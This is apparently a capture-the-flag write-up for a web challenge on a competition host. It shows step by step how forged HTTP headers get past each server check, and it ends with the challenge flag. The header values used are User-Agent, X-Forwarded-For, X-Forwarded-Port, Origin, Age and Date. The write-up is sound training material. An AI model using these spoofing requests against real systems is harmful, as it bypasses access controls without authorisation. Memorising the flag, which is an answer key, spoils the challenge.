## Solution

1. Initial Request: The first request to the /elite endpoint results in a response stating that ```"Only Elite Agents can access this page."``` This suggests the need to modify the User-Agent header.

```http
GET /elite HTTP/1.1
Host: chall.ycfteam.in:6375
User-Agent: Elite
```
Response: The page now instructs that requests must go through a dedicated proxy chain with specific IP addresses.
```raw
Elite members can access this endpoint only via our dedicated proxy chain:
50.23.41.34
3.54.85.90
110.34.87.34
10.43.21.25
```

2. Bypassing Proxy Chain: The next step involves adding an X-Forwarded-For header with the IPs provided.

```http
X-Forwarded-For: 50.23.41.34, 3.54.85.90, 110.34.87.34, 10.43.21.25
```
Response: The server now asks that requests come from a specific port number, 31173.
```raw
Nope! We only accept requests from our Elite port number - 31173. Leave!
```

3. Adding the Required Port: Include the X-Forwarded-Port header with the port number.

```http
X-Forwarded-Port: 31173
```
Response: The server questions the request origin, suggesting the need for an Origin header matching the host.
```
Wait! Where did this request even originate from? How dare you try to enter our club.
```

4. Setting the Origin: Add an Origin header pointing to the challenge domain.

```http
Origin: http://chall.ycfteam.in:6375/
```
Response: The server checks if the request was cached by the proxy servers for 5 seconds each.
```
Something's fishy... Your request to join the elite club should have been cached in each proxy server for 5 seconds. I don't like this. I can't allow you to join. Be gone!
```
5. Adding Cache Age: Set an Age header with a value of 20 seconds to simulate caching (because 4 proxy servers x 5 seconds = 20).

```http
Age: 20
```
Response: The server replies that the registration for the club closed on 27th May 2024 at 11 AM IST.
```
Oops! It seems you are too late my friend... We already closed the club registration on 27th May 2024 at 11 AM IST. Maybe next time...See ya!
```
6. Manipulating the Date: Finally, adjust the Date header any time before the specified date.

```http
Date: Wed, 21 Oct 2015 07:30:00 GMT
```
Response: Success! The server confirms that youâ€™ve proven to be "Elite" and provides the flag.
```
Alright then! You've proven that you are indeed Elite!! Congratulations on joining the club! It's great to have you on board with us. Here's your exclusive welcome gift: CyGenixCTF{W3lc0me_t0_Th3_ELIt3_5qU4d_5bf90dac2b7}
```
## Flag
```CyGenixCTF{W3lc0me_t0_Th3_ELIt3_5qU4d_5bf90dac2b7}```
This challenge involved progressively altering HTTP headers to bypass each security check imposed by the server, culminating in the successful retrieval of the flag.
